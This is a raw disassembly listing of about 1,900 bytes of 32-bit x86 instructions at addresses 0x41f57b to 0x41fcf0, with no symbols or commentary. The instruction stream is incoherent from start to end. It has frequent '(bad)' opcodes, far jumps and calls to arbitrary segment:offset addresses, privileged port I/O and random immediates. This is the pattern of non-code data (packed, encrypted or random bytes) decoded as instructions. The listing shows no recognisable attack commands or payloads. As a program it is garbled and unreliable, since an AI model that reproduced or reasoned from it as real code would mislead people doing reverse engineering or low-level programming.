  41f57b:	mov    dh,0x57
  41f57d:	ret    
  41f57e:	mov    edx,DWORD PTR [edx]
  41f580:	mov    edx,0x19e8cdb2
  41f585:	ss and al,dl
  41f588:	or     BYTE PTR [ecx+0x44b7298b],bl
  41f58e:	call   0x3707a15f
  41f593:	shl    DWORD PTR [ebx+ebx*2],cl
  41f596:	mov    dl,0x77
  41f598:	imul   esi,DWORD PTR [edx],0xffffffe7
  41f59b:	dec    edi
  41f59c:	mov    ds:0xac97c5e7,eax
  41f5a1:	pop    esp
  41f5a2:	loop   0x41f55c
  41f5a4:	adc    ecx,DWORD PTR [ecx-0x5a6c6a3f]
  41f5aa:	shr    bl,0xab
  41f5ad:	sbb    al,0x98
  41f5af:	jmp    0xf7b4:0xa44e0e42
  41f5b6:	fsub   st(4),st
  41f5b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5b9:	mov    esp,0x32214933
  41f5be:	adc    eax,0x3a422ca4
  41f5c3:	int3   
  41f5c4:	jmp    0x41f62b
  41f5c6:	and    DWORD PTR [eax],0xffffff8c
  41f5c9:	xchg   edx,eax
  41f5ca:	ret    
  41f5cb:	mov    BYTE PTR [ebx],0x5c
  41f5ce:	inc    ecx
  41f5cf:	pop    ecx
  41f5d0:	mov    esp,0xb752f7fc
  41f5d5:	test   BYTE PTR [edx+esi*4],ah
  41f5d8:	jb     0x41f614
  41f5da:	or     BYTE PTR ds:0x5d898e6e,ah
  41f5e0:	inc    ecx
  41f5e1:	mov    cl,0xa9
  41f5e3:	cmpxchg BYTE PTR [eax-0x3],dh
  41f5e7:	adc    al,0x6d
  41f5e9:	adc    al,0xd0
  41f5eb:	(bad)  
  41f5ec:	fcomp  st(2)
  41f5ee:	imul   DWORD PTR [ebx]
  41f5f0:	pop    ds
  41f5f1:	iret   
  41f5f2:	je     0x41f66e
  41f5f4:	pop    ss
  41f5f5:	mov    ds:0x5a8a3c4b,eax
  41f5fa:	or     eax,0x9a2c6c9
  41f5ff:	adc    al,0xfe
  41f601:	pusha  
  41f602:	push   es
  41f603:	xor    DWORD PTR [ebp+0x3e],eax
  41f606:	xchg   ecx,eax
  41f607:	test   BYTE PTR [ebp+0x5b4c06c],ch
  41f60d:	or     BYTE PTR [edi+0x367b07fb],dh
  41f613:	dec    ebx
  41f614:	lea    ebx,[ecx+0x3]
  41f617:	adc    eax,0x1c647903
  41f61c:	stc    
  41f61d:	cmp    DWORD PTR [eax+0x300539f5],ebx
  41f623:	cmp    BYTE PTR [eax-0x71b4d7b8],al
  41f629:	pop    edx
  41f62a:	sbb    ch,BYTE PTR [edx+0x3cd15d2a]
  41f630:	out    dx,al
  41f631:	pop    ebp
  41f632:	push   0x73
  41f634:	mov    eax,0xfffaed8f
  41f639:	mov    dl,0x46
  41f63b:	arpl   WORD PTR [eax+ecx*8+0x63429fbd],ax
  41f642:	std    
  41f643:	mov    dh,0x40
  41f645:	rcl    BYTE PTR [ebx+0x51b0c0ac],cl
  41f64b:	adc    BYTE PTR [ecx],ah
  41f64d:	adc    al,0x6a
  41f64f:	jo     0x41f6ca
  41f651:	ret    0xf3
  41f654:	dec    ecx
  41f655:	sbb    DWORD PTR [edx-0x6f],edi
  41f658:	pusha  
  41f659:	sar    BYTE PTR [edi],1
  41f65b:	imul   edi,eax,0xd73afdab
  41f661:	std    
  41f662:	cwde   
  41f663:	mov    al,ds:0x410b988b
  41f668:	add    bh,BYTE PTR [eax]
  41f66a:	dec    eax
  41f66b:	cmp    BYTE PTR [edi+0x19],dh
  41f66e:	and    eax,0x9d0bcb62
  41f673:	jae    0x41f674
  41f675:	mul    DWORD PTR [eax+0x49]
  41f678:	mov    al,0x6
  41f67a:	mov    ecx,0x493ac8cf
  41f67f:	mov    WORD PTR [esi-0x738d6f42],cs
  41f685:	pop    edi
  41f686:	fsubr  QWORD PTR [ebx-0x48]
  41f689:	mov    ds:0x555882d6,eax
  41f68e:	(bad)  
  41f68f:	enter  0xae6f,0xc4
  41f693:	jle    0x41f70e
  41f695:	xchg   edx,ebx
  41f697:	sub    al,0x25
  41f699:	xchg   ecx,ebp
  41f69b:	xchg   ebx,eax
  41f69c:	dec    edx
  41f69d:	pusha  
  41f69e:	into   
  41f69f:	mov    dh,0xf7
  41f6a1:	imul   edx,esi,0xc5da4fc1
  41f6a7:	xchg   esp,eax
  41f6a8:	adc    al,0x84
  41f6aa:	xchg   ecx,eax
  41f6ab:	fsub   st(4),st
  41f6ad:	sahf   
  41f6ae:	mov    es,WORD PTR [ecx+edx*4]
  41f6b1:	xor    DWORD PTR [esi-0x39c161c0],ebp
  41f6b7:	aam    0xbc
  41f6b9:	(bad)  
  41f6ba:	cmp    bl,BYTE PTR [esi+0x5]
  41f6bd:	push   edi
  41f6be:	inc    ecx
  41f6bf:	xchg   edi,eax
  41f6c0:	adc    eax,0x632bf690
  41f6c5:	and    bh,bh
  41f6c7:	xlat   BYTE PTR ds:[ebx]
  41f6c8:	hlt    
  41f6c9:	add    dh,bh
  41f6cb:	inc    ebx
  41f6cc:	jmp    0xaff5:0x837466d5
  41f6d3:	jecxz  0x41f6b4
  41f6d5:	mov    ds:0xd8630432,al
  41f6da:	xchg   ebp,esi
  41f6dc:	pop    es
  41f6dd:	(bad)  
  41f6de:	xchg   esp,eax
  41f6df:	mov    WORD PTR [ebp+0x1c009fc0],gs
  41f6e5:	push   ss
  41f6e6:	stc    
  41f6e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6e8:	cmc    
  41f6e9:	xor    al,BYTE PTR [edi+0x68dadc90]
  41f6ef:	xor    al,0x3
  41f6f1:	xchg   esp,eax
  41f6f2:	xchg   ecx,eax
  41f6f3:	pop    edx
  41f6f4:	sub    eax,0x26bd7373
  41f6f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6fa:	fidiv  DWORD PTR [esi+0x2aadf4b4]
  41f700:	sar    ah,0x89
  41f703:	sub    al,0xb9
  41f705:	lods   al,BYTE PTR ds:[esi]
  41f706:	sub    eax,0x10a3d619
  41f70b:	bound  eax,QWORD PTR [edi+0x323231fc]
  41f711:	fimul  WORD PTR [esi]
  41f713:	ret    
  41f714:	push   0x724f2e2b
  41f719:	and    edx,edi
  41f71b:	dec    edx
  41f71c:	addr16 std 
  41f71e:	push   edi
  41f71f:	nop
  41f720:	inc    edx
  41f721:	push   ebp
  41f722:	xor    ecx,DWORD PTR [eax]
  41f724:	push   0xffffffa2
  41f726:	jb     0x41f765
  41f728:	and    al,0xee
  41f72a:	sahf   
  41f72b:	clc    
  41f72c:	outs   dx,BYTE PTR ds:[esi]
  41f72d:	mov    DWORD PTR [edx+0x6fa63734],ebp
  41f733:	dec    ebp
  41f734:	inc    edx
  41f735:	rcr    DWORD PTR [ebp+0x7d],0x4d
  41f739:	daa    
  41f73a:	pushf  
  41f73b:	imul   esp,DWORD PTR [ebx-0x72],0x77
  41f73f:	ret    0xc87a
  41f742:	jle    0x41f770
  41f744:	mov    edi,0x289a8a20
  41f749:	and    al,0x76
  41f74b:	fstp   QWORD PTR [edx]
  41f74d:	dec    eax
  41f74e:	loopne 0x41f6d6
  41f750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f751:	cs (bad) 
  41f753:	and    dh,BYTE PTR [ebp-0x41]
  41f756:	popa   
  41f757:	and    edx,DWORD PTR [edx-0x5]
  41f75a:	mov    eax,ds:0xebe01ea7
  41f75f:	lea    eax,[esi-0x80]
  41f762:	iret   
  41f763:	cmc    
  41f764:	cmp    ah,BYTE PTR [esi]
  41f766:	ins    DWORD PTR es:[edi],dx
  41f767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f768:	fist   WORD PTR [ebp+0x35]
  41f76b:	out    0xd,al
  41f76d:	cld    
  41f76e:	jne    0x41f791
  41f770:	test   BYTE PTR [ebx+0x3de8515f],dh
  41f776:	aaa    
  41f777:	cmp    al,0xd1
  41f779:	ficomp DWORD PTR [edi+0x67]
  41f77c:	stos   DWORD PTR es:[edi],eax
  41f77d:	dec    edx
  41f77e:	repnz cwde 
  41f780:	push   esp
  41f781:	xor    BYTE PTR [edx+0x7d],al
  41f784:	lods   eax,DWORD PTR ds:[esi]
  41f785:	jne    0x41f72d
  41f787:	aad    0xe7
  41f789:	sbb    al,0xff
  41f78b:	inc    ecx
  41f78c:	jmp    0x38e:0xb453c1b1
  41f793:	jb     0x41f720
  41f795:	loop   0x41f76d
  41f797:	cmp    ebx,DWORD PTR [eax+esi*1+0x223f1ae2]
  41f79e:	das    
  41f79f:	jl     0x41f75f
  41f7a1:	jno    0x41f798
  41f7a3:	push   eax
  41f7a4:	(bad)  
  41f7a5:	xor    al,0x16
  41f7a7:	mov    dh,0xca
  41f7a9:	ficom  WORD PTR [ebp-0x14]
  41f7ac:	movmskps ebp,xmm2
  41f7af:	test   al,0xa3
  41f7b1:	adc    dh,dh
  41f7b3:	jmp    0x370aff78
  41f7b8:	and    esi,ecx
  41f7ba:	xchg   esp,eax
  41f7bb:	dec    ebp
  41f7bc:	xor    dh,BYTE PTR [ebp-0x2b]
  41f7bf:	add    al,0x99
  41f7c1:	stos   BYTE PTR es:[edi],al
  41f7c2:	pushf  
  41f7c3:	ins    DWORD PTR es:[edi],dx
  41f7c4:	mov    edi,DWORD PTR [eax]
  41f7c6:	gs fdiv st(0),st
  41f7c9:	aad    0xb9
  41f7cb:	ins    DWORD PTR es:[edi],dx
  41f7cc:	pop    esp
  41f7cd:	push   ebp
  41f7ce:	push   ecx
  41f7cf:	loopne 0x41f780
  41f7d1:	bound  edx,QWORD PTR [ebp-0x59]
  41f7d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7d5:	cli    
  41f7d6:	jge    0x41f843
  41f7d8:	ins    BYTE PTR es:[edi],dx
  41f7d9:	out    0x59,al
  41f7db:	leave  
  41f7dc:	inc    esp
  41f7dd:	fisttp QWORD PTR [edi-0x1d]
  41f7e0:	or     ecx,DWORD PTR [edi+0x3f]
  41f7e3:	dec    edi
  41f7e4:	out    dx,al
  41f7e5:	and    eax,0xeaec790e
  41f7ea:	push   ds
  41f7eb:	mov    dh,0x52
  41f7ed:	push   esi
  41f7ee:	or     BYTE PTR [esi],0x52
  41f7f1:	imul   edi,DWORD PTR [edi],0x8ff3821b
  41f7f7:	and    bl,0xb6
  41f7fa:	nop
  41f7fb:	xor    ch,al
  41f7fd:	fwait
  41f7fe:	jnp    0x41f787
  41f800:	fisubr DWORD PTR [ebx+ecx*4+0x14ba3de6]
  41f807:	jp     0x41f82a
  41f809:	(bad)  
  41f80a:	idiv   DWORD PTR [esi+0x63]
  41f80d:	jo     0x41f7b6
  41f80f:	test   cl,dl
  41f811:	sub    al,0x7
  41f813:	fidivr WORD PTR [edi]
  41f815:	xchg   dh,dh
  41f817:	push   0xf1d19723
  41f81c:	call   0xd8b54208
  41f821:	xchg   DWORD PTR [ecx],esi
  41f823:	or     al,0x68
  41f825:	or     dl,bl
  41f827:	jle    0x41f7d9
  41f829:	jnp    0x41f7d4
  41f82b:	pop    eax
  41f82c:	fnstcw WORD PTR [edx+0x72]
  41f82f:	jae    0x41f856
  41f831:	rol    BYTE PTR [ecx-0x67],0x9f
  41f835:	push   cs
  41f836:	int    0x5d
  41f838:	ja     0x41f7bd
  41f83a:	cmp    BYTE PTR [edi-0x3d],0x42
  41f83e:	outs   dx,DWORD PTR ds:[esi]
  41f83f:	or     al,0xe
  41f841:	int    0x8f
  41f843:	inc    edx
  41f844:	ficomp WORD PTR [ebp-0x5e59eef9]
  41f84a:	adc    edi,edi
  41f84c:	inc    edi
  41f84d:	popa   
  41f84e:	jno    0x41f7da
  41f850:	fstp   QWORD PTR [ebx+0x59b2b960]
  41f856:	mov    ebx,0x9bb800a9
  41f85b:	and    ebx,DWORD PTR [eax+0xb]
  41f85e:	fdivr  st(5),st
  41f860:	or     eax,0x5e56116
  41f865:	test   eax,0xfe932d4f
  41f86a:	sti    
  41f86b:	or     ebx,DWORD PTR [edx-0x1a]
  41f86e:	(bad)  
  41f86f:	jp     0x41f867
  41f871:	add    DWORD PTR [ebx+edi*8],edi
  41f874:	mov    edi,0x2d7e98f8
  41f879:	(bad)  
  41f87a:	xlat   BYTE PTR ds:[ebx]
  41f87b:	add    al,bh
  41f87d:	cmp    BYTE PTR [esi-0x67d5685e],ah
  41f883:	nop
  41f884:	daa    
  41f885:	mov    dl,0x6b
  41f887:	aas    
  41f888:	fs xor eax,0xce43f978
  41f88e:	pushf  
  41f88f:	les    esi,FWORD PTR [ebp+0xf]
  41f892:	mov    edi,DWORD PTR [edi+0x3a]
  41f895:	ret    
  41f896:	sbb    BYTE PTR ds:0x2bb244de,ch
  41f89c:	test   DWORD PTR [edi+0xa9454ac],edx
  41f8a2:	je     0x41f863
  41f8a4:	mov    bh,ah
  41f8a6:	test   al,0x8a
  41f8a8:	ins    DWORD PTR es:[edi],dx
  41f8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8aa:	jmp    0x3396:0xbbe8
  41f8b0:	jne    0x41f874
  41f8b2:	mov    WORD PTR [esi],ss
  41f8b4:	les    ecx,FWORD PTR [ebp+0x5a]
  41f8b7:	xor    ecx,eax
  41f8b9:	test   DWORD PTR [ecx+0x73],eax
  41f8bc:	push   es
  41f8bd:	or     dh,BYTE PTR [edx+0x7a]
  41f8c0:	jecxz  0x41f8c1
  41f8c2:	or     al,0x9
  41f8c4:	mov    ch,0x3
  41f8c6:	add    BYTE PTR [eax],bh
  41f8c8:	adc    eax,0xcc5c6707
  41f8cd:	out    0x46,al
  41f8cf:	mul    edx
  41f8d1:	xor    eax,0xa38a556c
  41f8d6:	xor    eax,0xa0b070f
  41f8db:	adc    BYTE PTR [esi+0xa],bh
  41f8de:	call   0x74e3:0x70fc1a28
  41f8e5:	nop
  41f8e6:	ins    BYTE PTR es:[edi],dx
  41f8e7:	push   0x4071ebfa
  41f8ec:	inc    esi
  41f8ed:	add    ebx,DWORD PTR [edi]
  41f8ef:	mov    ecx,0xaf9cd488
  41f8f4:	fsubp  st(4),st
  41f8f6:	leave  
  41f8f7:	lea    ecx,[edi+0x76]
  41f8fa:	sbb    DWORD PTR [edi+0x32],ebp
  41f8fd:	mov    DWORD PTR [eax+edi*1-0x6d],ebx
  41f901:	dec    edi
  41f902:	cmp    DWORD PTR [esi-0x55],0x4d
  41f906:	fisub  DWORD PTR [ebp+0x6a968983]
  41f90c:	imul   edx,esi,0xbe48382f
  41f912:	mov    dh,0xc3
  41f914:	mov    esi,DWORD PTR [ecx-0x12]
  41f917:	loopne 0x41f989
  41f919:	outs   dx,BYTE PTR ds:[esi]
  41f91a:	mov    bh,0x4d
  41f91c:	mov    edi,esp
  41f91e:	shr    BYTE PTR [edx+edx*2+0x1646affa],1
  41f925:	call   0x3513:0xd5d20175
  41f92c:	inc    ebp
  41f92d:	rol    BYTE PTR [edi+0x7505a54e],cl
  41f933:	daa    
  41f934:	and    al,0xee
  41f936:	ja     0x41f96a
  41f938:	cwde   
  41f939:	sbb    BYTE PTR [esi],bh
  41f93b:	shl    DWORD PTR [ecx],0xa7
  41f93e:	fwait
  41f93f:	test   DWORD PTR [edx],eax
  41f941:	jae    0x41f9bc
  41f943:	push   ebp
  41f944:	rcr    BYTE PTR [ecx+ecx*2],cl
  41f947:	clc    
  41f948:	mov    eax,0x7d2406b3
  41f94d:	ret    0xb56b
  41f950:	jecxz  0x41f946
  41f952:	mov    eax,ds:0xaeba056f
  41f957:	(bad)  
  41f958:	cld    
  41f959:	sbb    al,0xfa
  41f95b:	in     eax,0x8c
  41f95d:	jp     0x41f8f8
  41f95f:	xchg   esi,eax
  41f960:	or     DWORD PTR [ecx],esp
  41f962:	test   DWORD PTR [esi+0x1bd4d4b4],0x4f9e8392
  41f96c:	xor    eax,DWORD PTR [esp+edx*2+0x67]
  41f970:	pop    ds
  41f971:	or     eax,0x35ea90e5
  41f976:	add    edi,eax
  41f978:	ret    0x987a
  41f97b:	stc    
  41f97c:	mov    ecx,0xac91f84b
  41f981:	popa   
  41f982:	inc    ecx
  41f983:	pop    esi
  41f984:	jae    0x41f9fa
  41f986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f987:	aaa    
  41f988:	dec    edi
  41f989:	bound  ebx,QWORD PTR [esi]
  41f98b:	push   ecx
  41f98c:	call   0x1a77:0x16c5518f
  41f993:	push   esi
  41f994:	mov    bl,0x4b
  41f996:	out    0xf3,al
  41f998:	sti    
  41f999:	xchg   ebx,eax
  41f99a:	loop   0x41f990
  41f99c:	out    dx,al
  41f99d:	dec    eax
  41f99e:	sbb    ecx,DWORD PTR [esi]
  41f9a0:	rcl    DWORD PTR [edx],0x9d
  41f9a3:	in     al,0xdc
  41f9a5:	(bad)  
  41f9a6:	mov    eax,0x90ffde92
  41f9ab:	or     bh,cl
  41f9ad:	cwde   
  41f9ae:	(bad)  
  41f9b0:	stc    
  41f9b1:	sub    eax,edx
  41f9b3:	cmc    
  41f9b4:	mov    al,0x7f
  41f9b6:	je     0x41fa1a
  41f9b8:	sbb    bh,BYTE PTR [edi+0x8d151a4]
  41f9be:	adc    al,0x84
  41f9c0:	fisubr WORD PTR [esp+ebp*1+0x5eb42a66]
  41f9c7:	pop    edx
  41f9c8:	pop    edx
  41f9c9:	call   0xae6ec70e
  41f9ce:	loopne 0x41f9e9
  41f9d0:	sahf   
  41f9d1:	xchg   esp,eax
  41f9d2:	push   es
  41f9d3:	inc    esi
  41f9d4:	cmc    
  41f9d5:	inc    eax
  41f9d6:	add    BYTE PTR [ebx],0x57
  41f9d9:	mov    ah,0x5a
  41f9db:	(bad)  
  41f9dc:	adc    BYTE PTR [ebp-0x5cbe2c7c],ch
  41f9e2:	not    ecx
  41f9e4:	add    eax,DWORD PTR [eax]
  41f9e6:	les    edi,FWORD PTR [edi]
  41f9e8:	into   
  41f9e9:	test   al,0x85
  41f9eb:	js     0x41fa68
  41f9ed:	inc    ebp
  41f9ee:	test   DWORD PTR [ecx],edx
  41f9f0:	jbe    0x41f9ab
  41f9f2:	(bad)  
  41f9f3:	jae    0x41fa63
  41f9f5:	dec    edi
  41f9f6:	xor    ecx,DWORD PTR [ecx+0x4f]
  41f9f9:	jle    0x41fa1a
  41f9fb:	sub    DWORD PTR [edi],eax
  41f9fd:	mov    cs,WORD PTR [ecx+ebp*4]
  41fa00:	adc    eax,0xeb4be28b
  41fa05:	dec    ebx
  41fa06:	mov    ebx,ebp
  41fa08:	out    dx,eax
  41fa09:	out    0x8c,al
  41fa0b:	sbb    esp,DWORD PTR [esi]
  41fa0d:	inc    eax
  41fa0e:	sbb    eax,0x7fbbcae6
  41fa13:	cld    
  41fa14:	inc    ebx
  41fa15:	xor    ebx,DWORD PTR [ecx+0x3fb6a2c5]
  41fa1b:	(bad)  
  41fa1c:	clc    
  41fa1d:	adc    BYTE PTR [ebp-0x51683036],bh
  41fa23:	push   es
  41fa24:	std    
  41fa25:	jp     0x41f9b2
  41fa27:	inc    esi
  41fa28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa29:	ins    DWORD PTR es:[edi],dx
  41fa2a:	ror    edx,0x85
  41fa2d:	retf   
  41fa2e:	adc    al,0xbd
  41fa30:	cmp    al,0x88
  41fa32:	cdq    
  41fa33:	pop    esi
  41fa34:	imul   esp,DWORD PTR [edx-0x41f54505],0xabd6ea0c
  41fa3e:	sbb    BYTE PTR [eax+0x3e],dh
  41fa41:	dec    ebx
  41fa42:	out    0xea,al
  41fa44:	dec    ebp
  41fa45:	push   esi
  41fa46:	popf   
  41fa47:	int3   
  41fa48:	cmp    DWORD PTR [edx+ecx*1],0xe78e900c
  41fa4f:	pop    ds
  41fa50:	lock inc ebp
  41fa52:	inc    esi
  41fa53:	repnz (bad) 
  41fa55:	int3   
  41fa56:	test   eax,0x385d2156
  41fa5b:	out    dx,al
  41fa5c:	bound  esp,QWORD PTR [eax+0xe]
  41fa5f:	fdiv   st,st(5)
  41fa61:	mov    dl,0x29
  41fa63:	or     ebp,DWORD PTR [ecx]
  41fa65:	mov    eax,ds:0x3a0941
  41fa6a:	cwde   
  41fa6b:	imul   edx,DWORD PTR [ebx+esi*1+0x40],0x71dbde90
  41fa73:	xor    DWORD PTR [edi-0x55a6635],ecx
  41fa79:	jmp    0x6023e8cb
  41fa7e:	out    0x7c,al
  41fa80:	pusha  
  41fa81:	test   BYTE PTR [esi-0x25],ch
  41fa84:	jne    0x41fa52
  41fa86:	and    al,dh
  41fa88:	cmc    
  41fa89:	out    0x38,eax
  41fa8b:	dec    eax
  41fa8c:	push   ebp
  41fa8d:	test   al,0x81
  41fa8f:	ins    BYTE PTR es:[edi],dx
  41fa90:	jnp    0x41fa5a
  41fa92:	ins    DWORD PTR es:[edi],dx
  41fa93:	mov    ebx,0x350cdf08
  41fa98:	xchg   ebp,eax
  41fa99:	push   eax
  41fa9a:	mov    al,ds:0x9fe03390
  41fa9f:	xor    al,0x4d
  41faa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faa2:	ds xchg esp,eax
  41faa4:	xor    DWORD PTR [edx],edx
  41faa6:	test   eax,0xb1c248e0
  41faab:	xor    esp,edi
  41faad:	adc    eax,0x8f997163
  41fab2:	xchg   eax,edx
  41fab4:	sbb    al,0xd3
  41fab6:	cmp    eax,0xa75b0370
  41fabb:	ret    
  41fabc:	inc    edi
  41fabd:	mov    bh,0x83
  41fabf:	sub    eax,0xab5ac63b
  41fac4:	push   edx
  41fac5:	or     al,0x71
  41fac7:	xor    ah,ch
  41fac9:	mov    ebp,0x6b1b709f
  41face:	jo     0x41fb13
  41fad0:	xor    eax,0x8908a81a
  41fad5:	shr    BYTE PTR [ebx],1
  41fad7:	inc    edx
  41fad8:	pushf  
  41fad9:	dec    ecx
  41fada:	cmc    
  41fadb:	jmp    DWORD PTR [ebx]
  41fadd:	sbb    BYTE PTR ds:0xbf5f4272,bl
  41fae3:	adc    BYTE PTR [ecx-0x2cfc2d3b],ah
  41fae9:	jmp    0x839a:0x1955b117
  41faf0:	jl     0x41fabf
  41faf2:	mov    al,0xa3
  41faf4:	int    0x24
  41faf6:	pop    ss
  41faf7:	mov    ?,WORD PTR [esi+0x380a6fd8]
  41fafd:	push   0x58
  41faff:	and    eax,0x655ac456
  41fb04:	test   BYTE PTR [edi+0x50b5fd07],bl
  41fb0a:	shr    BYTE PTR [edi],0x2b
  41fb0d:	sub    al,0xba
  41fb0f:	sub    BYTE PTR [edx],bl
  41fb11:	dec    esi
  41fb12:	inc    esp
  41fb13:	or     dl,0x75
  41fb16:	mov    cl,BYTE PTR [esi]
  41fb18:	test   DWORD PTR [edx],ebp
  41fb1a:	fnstsw WORD PTR [ebx+0x76]
  41fb1d:	popf   
  41fb1e:	jbe    0x41fb68
  41fb20:	mov    al,ds:0xe1511a6b
  41fb25:	push   edx
  41fb26:	shr    BYTE PTR [ecx-0x38f9cda3],1
  41fb2c:	lods   eax,DWORD PTR ds:[esi]
  41fb2d:	jns    0x41fb7f
  41fb2f:	and    eax,0xfc854206
  41fb34:	call   0x4d390a7b
  41fb39:	cmp    eax,0xa3bf37be
  41fb3e:	out    0x73,al
  41fb40:	sbb    DWORD PTR [esi+0x430d3db],ecx
  41fb46:	stos   DWORD PTR es:[edi],eax
  41fb47:	loope  0x41fba5
  41fb49:	xor    edx,edx
  41fb4b:	inc    edx
  41fb4c:	sbb    ebp,DWORD PTR [edx]
  41fb4e:	ds mov esp,0x6f640611
  41fb54:	js     0x41fb8d
  41fb56:	fsub   DWORD PTR [esi]
  41fb58:	sbb    ebp,DWORD PTR [esi]
  41fb5a:	mov    eax,DWORD PTR [ecx-0xf9adba6]
  41fb60:	dec    BYTE PTR [edx+eax*4]
  41fb63:	adc    eax,0xfd022905
  41fb68:	push   0xffffffa8
  41fb6a:	ror    dl,0xe6
  41fb6d:	clc    
  41fb6e:	dec    BYTE PTR [esi]
  41fb70:	pop    ss
  41fb71:	pop    ds
  41fb72:	es icebp 
  41fb74:	cli    
  41fb75:	imul   ebp,esi,0x5
  41fb78:	add    eax,0x48a85539
  41fb7d:	std    
  41fb7e:	(bad)  
  41fb7f:	jecxz  0x41fb9c
  41fb81:	xor    BYTE PTR [eax-0x55],bh
  41fb84:	aas    
  41fb85:	fcmovnbe st,st(1)
  41fb87:	mov    edx,0x5c314e94
  41fb8c:	jae    0x41fb0f
  41fb8e:	(bad)  [eax-0x44f7930d]
  41fb94:	push   esp
  41fb95:	loopne 0x41fb7b
  41fb97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb98:	aam    0xa7
  41fb9a:	aam    0x7a
  41fb9c:	sub    eax,0xf52749ea
  41fba1:	out    0xaa,al
  41fba3:	daa    
  41fba4:	inc    edi
  41fba5:	cmp    edi,DWORD PTR [eax+0x52]
  41fba8:	sub    BYTE PTR [edi],ch
  41fbaa:	mov    WORD PTR [edi],cs
  41fbac:	xor    al,0x49
  41fbae:	std    
  41fbaf:	xor    edi,eax
  41fbb1:	les    eax,FWORD PTR [ebp+0x7c]
  41fbb4:	and    edx,DWORD PTR [eax-0x40]
  41fbb7:	mov    esi,0x928941e4
  41fbbc:	dec    esp
  41fbbd:	xchg   esp,eax
  41fbbe:	xchg   ebx,eax
  41fbbf:	sub    DWORD PTR [edx-0x41fb088e],esi
  41fbc5:	adc    eax,0x4116f04c
  41fbca:	js     0x41fb8d
  41fbcc:	inc    edi
  41fbcd:	sub    al,0xfe
  41fbcf:	dec    eax
  41fbd0:	bswap  eax
  41fbd2:	mov    edx,DWORD PTR ds:0xa8e8371f
  41fbd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbd9:	pop    ecx
  41fbda:	or     al,0x2b
  41fbdc:	adc    eax,0xb7f7445f
  41fbe1:	push   ss
  41fbe2:	idiv   DWORD PTR [edi-0xc0fd756]
  41fbe8:	push   edx
  41fbe9:	enter  0x12f6,0xdb
  41fbed:	test   BYTE PTR [edx-0x6f5a5e8],0xb2
  41fbf4:	add    al,0x99
  41fbf6:	jo     0x41fbc1
  41fbf8:	and    ebp,ebx
  41fbfa:	jl     0x41fbb9
  41fbfc:	mov    BYTE PTR fs:[ecx+0x3b12cddc],dh
  41fc03:	rol    al,0x1e
  41fc06:	call   0xf64:0xbf5466b2
  41fc0d:	mov    ds:0xf91c5171,eax
  41fc12:	add    BYTE PTR [edi-0x60],dl
  41fc15:	call   0x9e30017
  41fc1a:	add    eax,0x17f38b3d
  41fc1f:	or     BYTE PTR [ecx-0x77248ea3],bl
  41fc25:	add    bl,BYTE PTR [esi+0x2e]
  41fc28:	call   0x277f:0x3aecc1a7
  41fc2f:	jno    0x41fc4d
  41fc31:	into   
  41fc32:	mov    ch,0xb8
  41fc34:	cdq    
  41fc35:	fs nop
  41fc37:	das    
  41fc38:	jmp    0x41fc38
  41fc3a:	xchg   BYTE PTR [ebx],bh
  41fc3c:	div    BYTE PTR [edi-0x39f1eb60]
  41fc42:	rcl    eax,cl
  41fc44:	mov    ecx,0xd02fe2c1
  41fc49:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41fc4b:	sub    DWORD PTR [eax],esi
  41fc4d:	mov    esi,0x5e3b124a
  41fc52:	jg     0x41fcc1
  41fc54:	sbb    eax,0x6a5327dd
  41fc59:	pop    ebx
  41fc5a:	inc    ecx
  41fc5b:	adc    DWORD PTR [edx],ebx
  41fc5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc5e:	push   0x3b
  41fc60:	out    dx,eax
  41fc61:	aam    0xb3
  41fc63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc64:	sbb    DWORD PTR [ecx-0x1a8325c3],0x7
  41fc6b:	xor    ebp,DWORD PTR [eax]
  41fc6d:	or     eax,0xd8e8b23
  41fc72:	adc    esi,edi
  41fc74:	les    ebx,FWORD PTR [eax+0x31c48d7e]
  41fc7a:	lock daa 
  41fc7c:	fwait
  41fc7d:	or     ebx,0xa55ad1b2
  41fc83:	cdq    
  41fc84:	push   0x18
  41fc86:	out    dx,eax
  41fc87:	in     al,0x8b
  41fc89:	iret   
  41fc8a:	pop    edi
  41fc8b:	mov    al,BYTE PTR [esi]
  41fc8d:	add    DWORD PTR [edx],edx
  41fc8f:	adc    ebp,esi
  41fc91:	add    BYTE PTR [eax+0x5607bebd],bl
  41fc97:	or     DWORD PTR [esi+0x76],0x7d
  41fc9b:	repnz or DWORD PTR [ecx],esp
  41fc9e:	or     DWORD PTR [edx-0x28aab9c2],ecx
  41fca4:	or     ecx,DWORD PTR [edx]
  41fca6:	cmp    eax,0xe7840dda
  41fcab:	test   esp,0x49207de1
  41fcb1:	nop
  41fcb2:	arpl   WORD PTR [ebx-0x19],sp
  41fcb5:	sub    al,0xf8
  41fcb7:	shl    al,1
  41fcb9:	out    0x30,eax
  41fcbb:	fisub  DWORD PTR [eax+0x7149f5fc]
  41fcc1:	nop
  41fcc2:	or     DWORD PTR ds:0xb9f89c63,ebp
  41fcc8:	out    dx,al
  41fcc9:	mov    eax,0x7b5de6d4
  41fcce:	retf   
  41fccf:	add    DWORD PTR [edx],eax
  41fcd1:	dec    esp
  41fcd2:	xor    cl,BYTE PTR [edi+0x2004a3ef]
  41fcd8:	fiadd  WORD PTR [ecx]
  41fcda:	add    eax,0x12491cde
  41fcdf:	mov    dh,0x9d
  41fce1:	mov    bh,0x45
  41fce3:	adc    al,BYTE PTR ds:0x100ad742
  41fce9:	xchg   esi,eax
  41fcea:	cmp    eax,DWORD PTR [ebx-0x20]
  41fced:	aad    0xbf
  41fcef:	daa    
  41fcf0:	popf   
